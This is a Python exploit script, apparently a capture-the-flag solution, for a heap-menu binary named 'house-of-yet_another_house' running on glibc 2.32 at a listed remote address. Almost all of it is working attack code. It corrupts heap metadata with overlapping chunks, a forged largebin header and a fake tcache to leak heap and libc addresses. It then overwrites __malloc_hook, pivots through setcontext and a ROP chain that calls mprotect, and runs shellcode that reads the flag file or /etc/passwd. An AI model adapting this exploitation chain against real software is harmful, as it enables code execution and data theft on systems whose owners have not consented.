#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './house-of-yet_another_house'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'lsock', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', lsock = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./ld-2.32.so --library-path . {}'.format(bin_file).split(), 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':'./ld-2.32.so --library-path . {}'.format(bin_file).split()}, \
                        lsock   = {'host':'localhost', 'port':10111}, \
                        remote  = {'host':'69.90.132.248', 'port':11000})
env.set_item('offset_tcache', debug = 0x1c6578, local = 0x1c6578, lsock = 0x1c65b8, remote = 0x1c65b8)
env.set_item('flag_file'    , debug = None, local = None, lsock = None, remote = '/home/challenge/flag.txt')
# env.select('remote')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF('libc-2.32.so')
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    yah = YetAnotherHouse(conn)

    yah.new(0x928, 'a'*8) # 0
    yah.new(0x418, 'b'*8) # 1
    yah.new(0x418, 'c'*8) # 2 <--
    yah.new(0x108, 'd'*8) # 3  --
    yah.new(0x4f8, 'e'*8) # 4  -->
    yah.new(0x108, (b'f'*8 + p64(0x11))*2) # 5
    yah.new(0x428, 'g'*8) # 6
    yah.new(0x108, 'h'*8) # 7
    yah.new(0x418, 'i'*8) # 8
    yah.new(0x108, 'j'*8) # 9

    yah.delete(4)
    yah.delete(2)
    yah.delete(6)
    yah.delete(8)
    yah.delete(1)
    # 0,3,5,7,9

    yah.new(0x4f8, 'E'*8 + '\x00'*2)        # 1

    yah.new(0x838, b'B'*0x418 + p64(0x531)) # 2
    yah.edit(3, b'D'*0x100 + p64(0x530))

    yah.new(0x428, '\x00'*2)                # 4 (G)

    yah.delete(1)
    # 0,2,3,4,5,7,9

    yah.new(0x418, 'I'*8) # 1
    yah.new(0x418, 'C'*8) # 6
    yah.new(0x608, 'D'*8) # 8

    yah.delete(0)
    yah.new(0x5f8, 'A'*8) # 0
    yah.new(0x108, 'A'*8) # 10
    yah.delete(0)
    yah.delete(8)

    yah.new(0x618, 'k'*8) # 0
    yah.delete(0)
    # 1,2,3,4,5,6,7,9,10

    addr_heap_base = u(yah.show(3)) - 0x2b0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    yah.new(0x5f8, 'a'*8) # 0

    addr_libc_mainarena = u(yah.show(3)) - 0x4d0
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_malloc_hook = libc.symbols['__malloc_hook']
    addr_libc_setcontext  = libc.sep_function['setcontext']

    rop = ROP(libc)

    yah.delete(6)
    yah.new(0xa28, b'c'*0x418 + p64(0x621)) # 6
    yah.delete(3)

    yah.new(0x628, 'K'*8) # 3
    yah.delete(3)
    # 0,1,2,4,5,6,7,9,10

    largebin_header  = p64(0x621)
    largebin_header += p64(addr_libc_mainarena + 0x4d0)*2
    largebin_header += p64(addr_heap_base + 0x2b0)
    largebin_header += p64(libc.address + env.offset_tcache - 0x20)
    fake_tcache      = p64(0)*0x1a
    fake_tcache     += p64(addr_libc_malloc_hook)

    yah.delete(6)
    yah.new(0xa28, b'c'*0x418 + largebin_header + fake_tcache) # 3

    yah.delete(0)
    yah.new(0x628, 'k'*8) # 0
    # 0,1,2,3,4,5,7,9,10

    frame = SigreturnFrame()
    frame.rdi = addr_heap_base
    frame.rsi = 0x2000
    frame.rdx = 0x7
    frame.rsp = addr_heap_base + 0x400
    frame.rip = rop.ret.address

    rop.raw(rop.rax)
    rop.raw(constants.SYS_mprotect)
    rop.raw(libc.address + 0x0003ffc9)   # rop.syscall_ret.address
    rop.call(addr_heap_base + 0x420)

    shellasm  = shellcraft.open(env.flag_file if env.flag_file is not None else '/etc/passwd')
    shellasm += shellcraft.read('rax', addr_heap_base + 0x2000, 0x500)
    shellasm += shellcraft.write('STDOUT_FILENO', addr_heap_base + 0x2000, 'rax')
    shellasm += 'nop\n'*10

    exploit  = bytes(frame)[0x40:].ljust(0x400-0x2c0, b'\x00')
    exploit += bytes(rop)
    exploit += asm(shellasm)

    yah.new(0x5f8, exploit) # 6
    yah.new(0x118, p64(addr_libc_setcontext + 0x3d)) # 8
    conn.sendlineafter('| ', '1')
    conn.sendafter('Size: ', '7777')

class YetAnotherHouse:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def new(self, size, data):
        self.sendlineafter('| ', '1')
        self.sendafter('Size: ', str(size).ljust(4, '\x00'))
        self.sendafter('Data: ', data)

    def delete(self, idx):
        self.sendlineafter('| ', '2')
        self.sendafter('Index: ', str(idx).ljust(4, '\x00'))

    def show(self, idx):
        self.sendlineafter('| ', '3')
        self.sendafter('Index: ', str(idx).ljust(4, '\x00'))
        return self.recvuntil('\n|>', drop=True)

    def edit(self, idx, data):
        self.sendlineafter('| ', '4')
        self.sendafter('Index: ', str(idx).ljust(4, '\x00'))
        self.send(data)

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
